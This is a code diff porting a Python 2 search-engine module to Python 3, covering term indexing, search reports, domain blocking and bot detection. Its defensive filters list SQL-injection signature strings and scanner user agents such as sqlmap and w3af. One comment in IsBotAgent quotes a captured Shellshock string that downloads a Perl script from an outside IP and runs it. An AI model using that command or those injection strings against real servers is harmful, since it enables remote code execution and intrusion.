@@ -2351,19 +2349,19 @@ def AddPendingTerm(item, language_code='en', reason=None):
         return
     pending_model = GetPendingIndexModelFromLanguage(language_code)
     # Don't index things that only have a quote on one side - trim them.
-    if item.startswith(u"'") and not item.endswith(u"'"):
+    if item.startswith("'") and not item.endswith("'"):
         item = item[1:]
-    elif item.endswith(u"'") and not item.startswith(u"'"):
+    elif item.endswith("'") and not item.startswith("'"):
         item = item[:-1]
-    elif item.startswith(u'"') and not item.endswith(u'"'):
+    elif item.startswith('"') and not item.endswith('"'):
         item = item[1:]
-    elif item.endswith(u'"') and not item.startswith(u'"'):
+    elif item.endswith('"') and not item.startswith('"'):
         item = item[:-1]
-    if item.endswith(u'|'):
+    if item.endswith('|'):
         item = item[0:-1]
     item = item.lower()
     try:
-        existing = pending_model.objects.get(keywords=item)
+        pending_model.objects.get(keywords=item)
     except ObjectDoesNotExist:
         new_index = pending_model()
         new_index.keywords = item
@@ -2381,32 +2379,32 @@ def AddPendingTerm(item, language_code='en', reason=None):
 def TrySearchTerm(text, language_code):
     term_model = GetIndexModelFromLanguage(language_code)
     lowerterm = text.lower().strip()
-    if lowerterm.startswith(u"'") and not lowerterm.endswith(u"'"):
+    if lowerterm.startswith("'") and not lowerterm.endswith("'"):
         lowerterm = lowerterm[1:]
-    elif lowerterm.endswith(u"'") and not lowerterm.startswith(u"'"):
+    elif lowerterm.endswith("'") and not lowerterm.startswith("'"):
         lowerterm = lowerterm[:-1]
-    elif lowerterm.startswith(u'"') and not lowerterm.endswith(u'"'):
+    elif lowerterm.startswith('"') and not lowerterm.endswith('"'):
         lowerterm = lowerterm[1:]
-    elif lowerterm.endswith(u'"') and not lowerterm.startswith(u'"'):
+    elif lowerterm.endswith('"') and not lowerterm.startswith('"'):
         lowerterm = lowerterm[:-1]
-    if lowerterm.endswith(u'|'):
+    if lowerterm.endswith('|'):
         lowerterm = lowerterm[0:-1]
-    if lowerterm.endswith(u'/'):
+    if lowerterm.endswith('/'):
         lowerterm = lowerterm[0:-1]
-    if u'%%20' in lowerterm:
+    if '%%20' in lowerterm:
         lowerterm.replace('%%20', ' ')
-    if u'%20' in lowerterm:
+    if '%20' in lowerterm:
         lowerterm.replace('%20', ' ')
     try:
         term = term_model.objects.get(keywords=lowerterm)
         return term
     except ObjectDoesNotExist:
-        AddPendingTerm(lowerterm, language_code, u'Search {0} not indexed yet.'.format(text))
+        AddPendingTerm(lowerterm, language_code, 'Search {0} not indexed yet.'.format(text))
         return None
 
 # Try to search for a specific term or collection of terms from a list.
 # Combine these terms and return the result.
-#def TrySearchTerms(terms, language_code):
+# def TrySearchTerms(terms, language_code):
 
 # Do a title-only search for a phrase and create an index term for it.
 # Make sure that what is searched for is added to the pending terms so
@@ -2451,7 +2449,7 @@ def CreatePlaceholderIndexTerm(text, language_code):
             term = term_model.objects.get(keywords=text)
         term = JsonifyIndexTerm(term, language_code)
     # Add this to pending so we get a non-half-assed version.
-    AddPendingTerm(text, language_code, u'Search {0} not indexed yet.'.format(text))
+    AddPendingTerm(text, language_code, 'Search {0} not indexed yet.'.format(text))
     return term
 
 def GenerateIndexStats(save=False, verbose=False, nolinks=False):
@@ -2525,7 +2523,7 @@ def GenerateSearchReport(save=False, month=None, year=None, lang='en'):
     d = datetime.date.today()
     if not month and not year:
         first = datetime.date(d.year, d.month, 1)
-        last = datetime.date(d.year, d.month+1, 1)
+        last = datetime.date(d.year, d.month + 1, 1)
     else:
         yea = int(year)
         mon = int(month)
@@ -2535,11 +2533,11 @@ def GenerateSearchReport(save=False, month=None, year=None, lang='en'):
         if mon == 12:
             mon = 0
             yea += 1
-        last = datetime.date(yea, mon+1, 1)
+        last = datetime.date(yea, mon + 1, 1)
 
     try:
         report = MonthlySearchReport.objects.get(month=month, year=year, language=lang)
-        print u'Report already exists for {0}-{1} in {2}. Replacing.'.format(year, month, lang)
+        print('Report already exists for {0}-{1} in {2}. Replacing.'.format(year, month, lang))
     except ObjectDoesNotExist:
         report = MonthlySearchReport()
         report.month = first.month
@@ -2552,7 +2550,7 @@ def GenerateSearchReport(save=False, month=None, year=None, lang='en'):
     report.top_searches = ujson.dumps(list(searches))
     if save:
         report.save()
-    print str(report.total_searches) + ' searches in ' + report.language + ' in ' + str(report.year) + '-' + str(report.month)
+    print(str(report.total_searches) + ' searches in ' + report.language + ' in ' + str(report.year) + '-' + str(report.month))
     return report
 
 def GenerateMonthlySearchReports(month=None, year=None, language=None):
@@ -2566,7 +2564,7 @@ def GenerateMonthlySearchReports(month=None, year=None, language=None):
 
 
 def LogQueries(queries):
-    print "Queries: %s" % len(queries)
+    print("Queries: %s" % len(queries))
     totaltime = 0.0
     domaininfo = 0.0
     domaininfototal = 0
@@ -2722,33 +2720,33 @@ def LogQueries(queries):
             settingselect += float(query['time'])
             settingselecttotal += 1
         else:
-            print query
+            print(query)
             other += float(query['time'])
             othertotal += 1
 
-    print 'Domain Info Selects: {0} ({1} seconds)'.format(domaininfototal, domaininfo)
-    print 'Domain Info Updates: {0} ({1} seconds)'.format(domaininfoupdatetotal, domaininfoupdate)
-    print 'Domain Info Inserts: {0} ({1} seconds)'.format(domaininfoinserttotal, domaininfoinsert)
-    print 'Site Info Selects: {0} ({1} seconds)'.format(siteinfototal, siteinfo)
-    print 'Site Info Inserts: {0} ({1} seconds)'.format(siteinfoinserttotal, siteinfoinsert)
-    print 'Site Info Updates: {0} ({1} seconds)'.format(siteinfoupdatetotal, siteinfoupdate)
-    print 'Index Term Selects: {0} ({1} seconds)'.format(indextermtotal, indexterm)
-    print 'Index Term Updates: {0} ({1} seconds)'.format(indextermupdatetotal, indextermupdate)
-    print 'Index Term Inserts: {0} ({1} seconds)'.format(indexterminserttotal, indexterminsert)
-    print 'Pending Index Selects: {0} ({1} seconds)'.format(pendingindextotal, pendingindex)
-    print 'Pending Index Deletes: {0} ({1} seconds)'.format(pendingindexdeletetotal, pendingindexdelete)
-    print 'Crawlable URL Selects: {0} ({1} seconds)'.format(pendingurltotal, pendingurl)
-    print 'Crawlable URL Inserts: {0} ({1} seconds)'.format(pendingurlinserttotal, pendingurlinsert)
-    print 'Crawlable URL Deletes: {0} ({1} seconds)'.format(pendingurldeletetotal, pendingurldelete)
-    print 'URL Parameter Selects: {0} ({1} seconds)'.format(urlparamselecttotal, urlparamselect)
-    print 'URL Link Selects: {0} ({1} seconds)'.format(urllinkselecttotal, urllinkselect)
-    print 'URL Link Inserts: {0} ({1} seconds)'.format(urllinkinserttotal, urllinkinsert)
-    print 'Blocked Site Selects: {0} ({1} seconds)'.format(BlockedSitetotal, BlockedSite)
-    print 'Domain Suffix Selects: {0} ({1} seconds)'.format(domainextensiontotal, domainextension)
-    print 'Setting Selects: {0} ({1} seconds)'.format(settingselecttotal, settingselect)
-    print 'Keyword Ranking Selects, Inserts, and Deletes: {0} ({1} seconds)'.format(keywordrankingtotal, keywordranking)
-    print 'Big Select Selects: {0} ({1} seconds)'.format(bigselecttotal, bigselect)
-    print 'Other: {0} ({1} seconds)'.format(othertotal, other)
+    print('Domain Info Selects: {0} ({1} seconds)'.format(domaininfototal, domaininfo))
+    print('Domain Info Updates: {0} ({1} seconds)'.format(domaininfoupdatetotal, domaininfoupdate))
+    print('Domain Info Inserts: {0} ({1} seconds)'.format(domaininfoinserttotal, domaininfoinsert))
+    print('Site Info Selects: {0} ({1} seconds)'.format(siteinfototal, siteinfo))
+    print('Site Info Inserts: {0} ({1} seconds)'.format(siteinfoinserttotal, siteinfoinsert))
+    print('Site Info Updates: {0} ({1} seconds)'.format(siteinfoupdatetotal, siteinfoupdate))
+    print('Index Term Selects: {0} ({1} seconds)'.format(indextermtotal, indexterm))
+    print('Index Term Updates: {0} ({1} seconds)'.format(indextermupdatetotal, indextermupdate))
+    print('Index Term Inserts: {0} ({1} seconds)'.format(indexterminserttotal, indexterminsert))
+    print('Pending Index Selects: {0} ({1} seconds)'.format(pendingindextotal, pendingindex))
+    print('Pending Index Deletes: {0} ({1} seconds)'.format(pendingindexdeletetotal, pendingindexdelete))
+    print('Crawlable URL Selects: {0} ({1} seconds)'.format(pendingurltotal, pendingurl))
+    print('Crawlable URL Inserts: {0} ({1} seconds)'.format(pendingurlinserttotal, pendingurlinsert))
+    print('Crawlable URL Deletes: {0} ({1} seconds)'.format(pendingurldeletetotal, pendingurldelete))
+    print('URL Parameter Selects: {0} ({1} seconds)'.format(urlparamselecttotal, urlparamselect))
+    print('URL Link Selects: {0} ({1} seconds)'.format(urllinkselecttotal, urllinkselect))
+    print('URL Link Inserts: {0} ({1} seconds)'.format(urllinkinserttotal, urllinkinsert))
+    print('Blocked Site Selects: {0} ({1} seconds)'.format(BlockedSitetotal, BlockedSite))
+    print('Domain Suffix Selects: {0} ({1} seconds)'.format(domainextensiontotal, domainextension))
+    print('Setting Selects: {0} ({1} seconds)'.format(settingselecttotal, settingselect))
+    print('Keyword Ranking Selects, Inserts, and Deletes: {0} ({1} seconds)'.format(keywordrankingtotal, keywordranking))
+    print('Big Select Selects: {0} ({1} seconds)'.format(bigselecttotal, bigselect))
+    print('Other: {0} ({1} seconds)'.format(othertotal, other))
 
     return totaltime
 
@@ -2762,9 +2760,9 @@ def PornBlock(item=None, url=None):
     itself.
     """
     if url is not None:
-        parsedurl = urlparse.urlparse(url).path
+        parsedurl = urllib.parse.urlparse(url).path
     elif item is not None:
-        parsedurl = urlparse.urlparse(item.url).netloc
+        parsedurl = urllib.parse.urlparse(item.url).netloc
     else:
         print('PornBlock: Invalid call. Must supply url or DomainInfo object.')
         return False
@@ -2774,7 +2772,7 @@ def PornBlock(item=None, url=None):
         # If this domain is unblockable, then just delete the URL, because if someone checked
         # blog they at least want to nuke the URLs they just selected.
         if domain.is_unblockable:
-            print 'Domain is unblockable, just deleting URL {0}'.format(item.url)
+            print('Domain is unblockable, just deleting URL {0}'.format(item.url))
             item.delete()
             return
     except ObjectDoesNotExist:
@@ -2792,26 +2790,26 @@ def PornBlock(item=None, url=None):
     elif url:
         rooturl = GetRootUrl(parsedurl)
         rootdomain = GetRootDomain(parsedurl)
-    print u'Rootdomain is {0}'.format(rootdomain)
+    print('Rootdomain is {0}'.format(rootdomain))
     # Track whether the root domain is unblockable.
     unblockable = False
     try:
         domain = DomainInfo.objects.get(url=rootdomain)
         if domain.is_unblockable:
-            print u'Root domain {0} is unblockable.'.format(rootdomain)
+            print('Root domain {0} is unblockable.'.format(rootdomain))
             unblockable = True
     except ObjectDoesNotExist:
         pass
     # If the root domain does not match the current domain, block the root and clear out its
     # URLs, provided the root is not unblockable.
     if (rootdomain != rooturl) and not unblockable:
-        print u'Removing URLs for root domain {0}.'.format(rootdomain)
+        print('Removing URLs for root domain {0}.'.format(rootdomain))
         RemoveURLsForDomain(rootdomain)
         try:
             site = BlockedSite.objects.get(url=rootdomain)
-            print u'Root domain {0} was already blocked. That is odd.'.format(rootdomain)
+            print('Root domain {0} was already blocked. That is odd.'.format(rootdomain))
         except ObjectDoesNotExist:
-            print u'Adding BlockedSite for root domain {0}.'.format(rootdomain)
+            print('Adding BlockedSite for root domain {0}.'.format(rootdomain))
             site = BlockedSite()
             site.url = rootdomain
             site.reason = 4
@@ -2822,13 +2820,13 @@ def PornBlock(item=None, url=None):
     # Or, if this *is* the root domain, clear out all of the URLs, provided they are not blockable.
     # Technically, the "domain is root" and blockable case will never be true due to the check at the
     # beginning of this function, so we just go ahead and block.
-    print u'Blocking URLs for domain {0}'.format(parsedurl)
+    print('Blocking URLs for domain {0}'.format(parsedurl))
     RemoveURLsForDomain(parsedurl)
     try:
         existing = BlockedSite.objects.get(url=parsedurl)
-        print u'Domain {0} was already blocked. That is odd.'.format(parsedurl)
+        print('Domain {0} was already blocked. That is odd.'.format(parsedurl))
     except ObjectDoesNotExist:
-        print u'Adding BlockedSite for domain {0}.'.format(parsedurl)
+        print('Adding BlockedSite for domain {0}.'.format(parsedurl))
         site = BlockedSite()
         site.url = parsedurl
         site.reason = 4
@@ -2844,13 +2842,13 @@ def PornBlock(item=None, url=None):
         pass
 
 def BannedSearchString(text):
-    #print 'Checking {0} for banned search string.'.format(text)
+    # print 'Checking {0} for banned search string.'.format(text)
     if '\0' in text:
         return True
-    if (text.endswith(u'a=0') or text.endswith(u'A=0') or u'11111111' in text or u'999999' in text or u'sleep(3)' in text or
-      u'result: ' in text or u'concat((select' in text or u'unhex(hex(' in text or u'name_const(char(' in text or u'rk=0' in text or
-      u'1=1' in text or u'1=2' in text or u'union all select' in text or u'null,concat(' in text or u'and 1>1' in text or
-      u'2121121121212.1' in text or u"and 'x'='" in text or u'and "x"="' in text):
+    if (text.endswith('a=0') or text.endswith('A=0') or '11111111' in text or '999999' in text or 'sleep(3)' in text or
+      'result: ' in text or 'concat((select' in text or 'unhex(hex(' in text or 'name_const(char(' in text or 'rk=0' in text or
+      '1=1' in text or '1=2' in text or 'union all select' in text or 'null,concat(' in text or 'and 1>1' in text or
+      '2121121121212.1' in text or "and 'x'='" in text or 'and "x"="' in text):
         return True
     try:
         bad = BadQuery.objects.get(keywords=text)
@@ -2929,7 +2927,7 @@ def RequeueRankedKeywordsForDomain(domain):
         except ObjectDoesNotExist:
             pending = pending_model()
             pending.keywords = rank.keywords
-            reason = u'Domain {0} blocked and it ranks {1} for {2}'.format(domain, rank.rank, rank.keywords)
+            reason = 'Domain {0} blocked and it ranks {1} for {2}'.format(domain, rank.rank, rank.keywords)
             if len(reason) > 240:
                 reason = reason[0:240]
             pending.reason = reason
@@ -2937,235 +2935,235 @@ def RequeueRankedKeywordsForDomain(domain):
 
 def IsBotAgent(text):
     # Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
-    if u'Googlebot' in text:
+    if 'Googlebot' in text:
         return True
     # Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
-    if u'bingbot' in text:
+    if 'bingbot' in text:
         return True
     # Mozilla/5.0 (compatible; Applebot/0.3; +http://www.apple.com/go/applebot)
-    if u'Applebot' in text:
+    if 'Applebot' in text:
         return True
     # Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon
-    if u'Google Favicon' in text:
+    if 'Google Favicon' in text:
         return True
     # Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6 - James BOT - WebCrawler http://cognitiveseo.com/bot.html
-    if u'James BOT' in text:
+    if 'James BOT' in text:
         return True
     # Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)
-    if u'MJ12bot' in text:
+    if 'MJ12bot' in text:
         return True
     # Mozilla/5.0 (compatible; linkdexbot/2.0; +http://www.linkdex.com/bots/)
-    if u'linkdexbot' in text:
+    if 'linkdexbot' in text:
         return True
     # Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
-    if u'Yahoo! Slurp' in text:
+    if 'Yahoo! Slurp' in text:
         return True
     # msnbot/0.01 (+http://search.msn.com/msnbot.htm)
     # msnbot/2.0b (+http://search.msn.com/msnbot.htm)
     # msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)
-    if u'msnbot' in text:
+    if 'msnbot' in text:
         return True
     # New-Sogou-Spider/1.0 (compatible; MSIE 5.5; Windows 98)
-    if u'Sogou' in text:
+    if 'Sogou' in text:
         return True
     # LinkedInBot/1.0 (compatible; Mozilla/5.0; Jakarta Commons-HttpClient/3.1 +http://www.linkedin.com)
-    if u'LinkedInBot' in text:
+    if 'LinkedInBot' in text:
         return True
     # ia_archiver
     # ia_archiver (+http://www.alexa.com/site/help/webmasters; crawler@alexa.com)
-    if u'ia_archiver' in text:
+    if 'ia_archiver' in text:
         return True
     # rogerbot/1.0 (http://moz.com/help/pro/what-is-rogerbot-, rogerbot-crawler+shiny@moz.com)
     # rogerbot/1.0 (http://moz.com/help/pro/what-is-rogerbot-, rogerbot-wherecat@moz.com)
-    if u'rogerbot' in text:
+    if 'rogerbot' in text:
         return True
     # Mozilla/5.0 (compatible; linkdexbot/2.0; +http://www.linkdex.com/bots/)
-    if u'linkdexbot' in text:
+    if 'linkdexbot' in text:
         return True
     # Raven Link Checker
-    if u'Raven Link Checker' in text:
+    if 'Raven Link Checker' in text:
         return True
     # Mozilla/5.0 (compatible; Gluten Free Crawler/1.0; +http://glutenfreepleasure.com/)
-    if u'Gluten Free Crawler' in text:
+    if 'Gluten Free Crawler' in text:
         return True
     # Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http://megaindex.com/crawler)
-    if u'MegaIndex.ru' in text:
+    if 'MegaIndex.ru' in text:
         return True
     # Mozilla/5.0 (compatible; XoviBot/2.0; +http://www.xovibot.net/)
-    if u'XoviBot' in text:
+    if 'XoviBot' in text:
         return True
     # tbot-nutch/Nutch-1.10
-    if u'nutch' in text:
+    if 'nutch' in text:
         return True
     # Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
-    if u'YandexBot' in text:
+    if 'YandexBot' in text:
         return True
     # Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)
-    if u'AhrefsBot' in text:
+    if 'AhrefsBot' in text:
         return True
     # Wget/1.15 (linux-gnu)
-    if u'Wget' in text:
+    if 'Wget' in text:
         return True
     # Go HTTP Client
-    if u'Go-http-client' in text:
+    if 'Go-http-client' in text:
         return True
     # Dispatch/0.11.1-SNAPSHOT
-    if u'Dispatch/0' in text:
+    if 'Dispatch/0' in text:
         return True
     # Apache-HttpClient/4.3.5 (java 1.5)
-    if u'Apache-HttpClient' in text:
+    if 'Apache-HttpClient' in text:
         return True
     # Scrapy/0.24.6 (+http://scrapy.org)
-    if u'Scrapy/' in text:
+    if 'Scrapy/' in text:
         return True
     # VegeBot
-    if u'VegeBot' in text:
+    if 'VegeBot' in text:
         return True
     # Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9465214528223723633)
-    if u'Feedfetcher-Google' in text:
+    if 'Feedfetcher-Google' in text:
         return True
     # Mozilla/5.0 (compatible; Seznam screenshot-generator 2.1; +http://fulltext.sblog.cz/screenshot/)
-    if u'Seznam screenshot-generator' in text:
+    if 'Seznam screenshot-generator' in text:
         return True
     # Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
-    if u'Baiduspider' in text:
+    if 'Baiduspider' in text:
         return True
     # BaiduSpider
-    if u'BaiduSpider' in text:
+    if 'BaiduSpider' in text:
         return True
     # Mozilla/5.0 (compatible; archive.org_bot +http://www.archive.org/details/archive.org_bot)
-    if u'archive.org_bot' in text:
+    if 'archive.org_bot' in text:
         return True
     # EventMachine HttpClient
-    if u'EventMachine HttpClient' in text:
+    if 'EventMachine HttpClient' in text:
         return True
     # Mozilla/5.0 (compatible; seplinkbot/1.0 )
-    if u'seplinkbot' in text:
+    if 'seplinkbot' in text:
         return True
     # Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )
-    if u'spbot' in text:
+    if 'spbot' in text:
         return True
     # Mozilla/5.0 (compatible; WBSearchBot/1.1; +http://www.warebay.com/bot.html)
-    if u'WBSearchBot' in text:
+    if 'WBSearchBot' in text:
         return True
     # CakePHP
-    if u'CakePHP' in text:
+    if 'CakePHP' in text:
         return True
     # Ruby
-    if u'Ruby' in text:
+    if 'Ruby' in text:
         return True
     # GarlikCrawler/1.2 (http://garlik.com/, crawler@garlik.com)
-    if u'GarlikCrawler' in text:
+    if 'GarlikCrawler' in text:
         return True
     # Mozilla/5.0 (compatible; proximic; +http://www.proximic.com/info/spider.php)
-    if u'proximic' in text:
+    if 'proximic' in text:
         return True
     # BCKLINKS 1.0
-    if u'BCKLINKS' in text:
+    if 'BCKLINKS' in text:
         return True
     # Xenu Link Sleuth/1.3.8
-    if u'Xenu Link Sleuth' in text:
+    if 'Xenu Link Sleuth' in text:
         return True
     # Blackboard Safeassign
-    if u'Blackboard Safeassign' in text:
+    if 'Blackboard Safeassign' in text:
         return True
     # Curious George - www.analyticsseo.com/crawler
-    if u'Curious George' in text:
+    if 'Curious George' in text:
         return True
     # facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
-    if u'facebookexternalhit' in text:
+    if 'facebookexternalhit' in text:
         return True
     # vq_web_crawler AppEngine-Google; (+http://code.google.com/appengine; appid: s~vayoola-q)
-    if u'vq_web_crawler' in text:
+    if 'vq_web_crawler' in text:
         return True
     # sqlmap/1.0-dev (http://sqlmap.org)
-    if u'sqlmap' in text:
+    if 'sqlmap' in text:
         return True
     # Mozilla/5.0 (compatible; Cliqzbot/1.0 +http://cliqz.com/company/cliqzbot)
-    if u'Cliqzbot' in text:
+    if 'Cliqzbot' in text:
         return True
     # PHPCrawl
-    if u'PHPCrawl' in text:
+    if 'PHPCrawl' in text:
         return True
     # Niki-Bot
-    if u'Niki-Bot' in text:
+    if 'Niki-Bot' in text:
         return True
     # HTMLParser/2.0
-    if u'HTMLParser' in text:
+    if 'HTMLParser' in text:
         return True
     # Wotbox/2.01 (+http://www.wotbox.com/bot/)
-    if u'Wotbox' in text:
+    if 'Wotbox' in text:
         return True
     # GigablastOpenSource/1.0
-    if u'GigablastOpenSource' in text:
+    if 'GigablastOpenSource' in text:
         return True
     # libwww-perl/6.05
-    if u'libwww-perl' in text:
+    if 'libwww-perl' in text:
         return True
     # Java/1.8.0_51
-    if u'Java/' in text:
+    if 'Java/' in text:
         return True
     # python-requests/2.7.0 CPython/3.4.0 Linux/3.13.0-48-generic
-    if u'python-requests' in text:
+    if 'python-requests' in text:
         return True
     # Mozilla/5.0 (Windows NT 6.2) Insitesbot/1.0
-    if u'Insitesbot' in text:
+    if 'Insitesbot' in text:
         return True
     # Domain Re-Animator Bot (http://domainreanimator.com) - support@domainreanimator.com
-    if u'Domain Re-Animator' in text:
+    if 'Domain Re-Animator' in text:
         return True
     # Y!J-ASR/0.1 crawler (http://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)
-    if u'Y!J-ASR' in text:
+    if 'Y!J-ASR' in text:
         return True
     # Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; Girafabot; girafabot at girafa dot com; http://www.girafa.com)
-    if u'Girafabot' in text:
+    if 'Girafabot' in text:
         return True
     # Mozilla/5.0 (compatible; GoogleDocs; apps-spreadsheets; +http://docs.google.com)
-    if u'GoogleDocs' in text:
+    if 'GoogleDocs' in text:
         return True
     # Grammarly/1.0 (http://www.grammarly.com)
-    if u'Grammarly' in text:
+    if 'Grammarly' in text:
         return True
     # BDFetch
-    if u'BDFetch' in text:
+    if 'BDFetch' in text:
         return True
     # sfFeedReader/0.9
-    if u'sfFeedReader' in text:
+    if 'sfFeedReader' in text:
         return True
     # w3af.org
-    if u'w3af.org' in text:
+    if 'w3af.org' in text:
         return True
     # Mozilla/4.0 (compatible; Synapse)
-    if u'Synapse' in text:
+    if 'Synapse' in text:
         return True
     # Mozilla/5.0 (compatible; memoryBot/1.21.14 +http://mignify.com/bot.html)
-    if u'memoryBot' in text:
+    if 'memoryBot' in text:
         return True
     # US!
     # Mozilla/5.0 (compatible; WbSrch/1.1 +http://wbsrch.com)
-    if u'WbSrch' in text:
+    if 'WbSrch' in text:
         return True
     # ltx71 - (http://ltx71.com/)
-    if u'ltx71' in text:
+    if 'ltx71' in text:
         return True
     # Mozilla/5.0 (compatible; CsQuery/1.3)
-    if u'CsQuery' in text:
+    if 'CsQuery' in text:
         return True
     # Mozilla/5.0 (compatible; aiHitBot/2.9; +http://www.aihitdata.com/about)
-    if u'aiHitBot' in text:
+    if 'aiHitBot' in text:
         return True
     # SBL-BOT (http://sbl.net)
-    if u'SBL-BOT' in text:
+    if 'SBL-BOT' in text:
         return True
     # Pizilla++ ver 2.45
-    if u'Pizilla++' in text:
+    if 'Pizilla++' in text:
         return True
     # Python-urllib/2.7
-    if u'Python-urllib' in text:
+    if 'Python-urllib' in text:
         return True
     # Ghetto hack attempt
     # () { :;}; /bin/bash -c "curl -O http://103.1.185.91//b00t.pl -o /tmp/b00t.pl; lwp-download -a http://103.1.185.91/b00t.pl /tmp/b00t.pl;wget http://103.1.185.91/b00t.pl -O /tmp/b00t.pl;perl /tmp/b00t.pl;rm -f /tmp/b00t.pl*;mkdir /tmp/b00t.pl"
-    if u'/bin/bash' in text:
+    if '/bin/bash' in text:
         return True
     # Screaming Frog SEO Spider/2.11
     # Screaming Frog SEO Spider/2.20
@@ -3179,171 +3177,171 @@ def IsBotAgent(text):
     # Screaming Frog SEO Spider/3.3
     # Screaming Frog SEO Spider/4.1
     # Screaming Frog SEO Spider/5.0
-    if u'Screaming Frog SEO' in text:
+    if 'Screaming Frog SEO' in text:
         return True
     # 360Spider / HaoSouSpider
-    if u'360Spider' in text:
+    if '360Spider' in text:
         return True
     # LinkWalker/3.0 (http://www.brandprotect.com)
-    if u'LinkWalker' in text:
+    if 'LinkWalker' in text:
         return True
     # FRCrawler
-    if u'FRCrawler' in text:
+    if 'FRCrawler' in text:
         return True
     # SafeAds.xyz bot
-    if u'SafeAds.xyz' in text:
+    if 'SafeAds.xyz' in text:
         return True
     # mindUpBot (datenbutler.de)
-    if u'mindUpBot' in text:
+    if 'mindUpBot' in text:
         return True
     # USER_AGENT
-    if u'USER_AGENT' in text:
+    if 'USER_AGENT' in text:
         return True
     # Delphi 2009
-    if u'Delphi 2009' in text:
+    if 'Delphi 2009' in text:
         return True
     # WeSEE:Ads/PageBot (http://www.wesee.com/bot/)
-    if u'WeSEE:Ads/PageBot' in text:
+    if 'WeSEE:Ads/PageBot' in text:
         return True
     # btcrawler
-    if u'btcrawler' in text:
+    if 'btcrawler' in text:
         return True
     # Mozilla/5.0 (compatible; SEOdiver/1.0; +http://www.seodiver.com/bot)
-    if u'SEOdiver' in text:
+    if 'SEOdiver' in text:
         return True
     # Mozilla/5.0 (compatible; DomainAppender /1.0; +http://www.profound.net/domainappender)
-    if u'DomainAppender' in text:
+    if 'DomainAppender' in text:
         return True
     # SafeSearch microdata crawler (https://safesearch.avira.com, safesearch-abuse@avira.com)
-    if u'SafeSearch microdata crawler' in text:
+    if 'SafeSearch microdata crawler' in text:
         return True
     # BusinessBot: Nathan@lead-caddy.com
-    if u'BusinessBot' in text:
+    if 'BusinessBot' in text:
         return True
     # Mozilla/5.0 (compatible; SeznamBot/3.2-test1; +http://fulltext.sblog.cz/)
-    if u'SeznamBot' in text:
+    if 'SeznamBot' in text:
         return True
     # Twitterbot/1.0
-    if u'Twitterbot' in text:
+    if 'Twitterbot' in text:
         return True
     # Sistrix
-    if u'Sistrix' in text:
+    if 'Sistrix' in text:
         return True
     # Mozilla/5.0 (Windows NT 6.1) (compatible; SMTBot/1.0; +http://www.similartech.com/smtbot)
-    if u'SMTBot' in text:
+    if 'SMTBot' in text:
         return True
     # linkapediabot (+http://www.linkapedia.com)
-    if u'linkapediabot' in text:
+    if 'linkapediabot' in text:
         return True
     # http://www.checkprivacy.or.kr:6600/RS/PRIVACY_ENFAQ.jsp
-    if u'checkprivacy.or.kr' in text:
+    if 'checkprivacy.or.kr' in text:
         return True
     # Mozilla/5.0 (compatible; NetSeer crawler/2.0; +http://www.netseer.com/crawler.html; crawler@netseer.com)
-    if u'NetSeer' in text:
+    if 'NetSeer' in text:
         return True
     # Faraday v0.9.1
     # Faraday v0.9.2
-    if u'Faraday v' in text:
+    if 'Faraday v' in text:
         return True
     # Jakarta Commons-HttpClient/3.1
-    if u'Jakarta Commons-HttpClient' in text:
+    if 'Jakarta Commons-HttpClient' in text:
         return True
     # Mozilla/5.0 Moreover/5.1 (+http://www.moreover.com; webmaster@moreover.com)
-    if u'Moreover/' in text:
+    if 'Moreover/' in text:
         return True
     # Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)
-    if u'BLEXBot' in text:
+    if 'BLEXBot' in text:
         return True
     # HubPages V0.2.2 (http://hubpages.com/help/crawlingpolicy)
-    if u'HubPages' in text:
+    if 'HubPages' in text:
         return True
     # Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv 11.0) like Gecko (compatible; Zombiebot/2.1; +http://www.zombiedomain.net/robot/)
-    if u'Zombiebot' in text:
+    if 'Zombiebot' in text:
         return True
     # Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0 ; Claritybot)
-    if u'Claritybot' in text:
+    if 'Claritybot' in text:
         return True
     # istellabot/Nutch-1.10
-    if u'istellabot' in text:
+    if 'istellabot' in text:
         return True
     # knil (no idea what it is, but assuming a bot)
-    if u'knil' in text:
+    if 'knil' in text:
         return True
     # WikiDo/1.1 (http://wikido.com; crawler@wikido.com)
-    if u'WikiDo' in text:
+    if 'WikiDo' in text:
         return True
     # bhcBot
-    if u'bhcBot' in text:
+    if 'bhcBot' in text:
         return True
     # AppEngine-Google; (+http://code.google.com/appengine; appid: s~repcore-prod)
-    if u'AppEngine-Google' in text:
+    if 'AppEngine-Google' in text:
         return True
     # QCrawl
-    if u'QCrawl' in text:
+    if 'QCrawl' in text:
         return True
     # gooblog/2.0 (http://help.goo.ne.jp/contact/)
-    if u'gooblog' in text:
+    if 'gooblog' in text:
         return True
     # Mozilla/5.0 (TweetmemeBot/4.0; +http://datasift.com/bot.html) Gecko/20100101 Firefox/31.0
-    if u'TweetmemeBot' in text:
+    if 'TweetmemeBot' in text:
         return True
     # wonderbot/JS 1.0
-    if u'wonderbot' in text:
+    if 'wonderbot' in text:
         return True
     # Curl/PHP 5.4.45 (http://github.com/shuber/curl)
-    if u'Curl/PHP' in text:
+    if 'Curl/PHP' in text:
         return True
     # curl/7.40.0
-    if u'curl/' in text:
+    if 'curl/' in text:
         return True
     # AHC/1.0
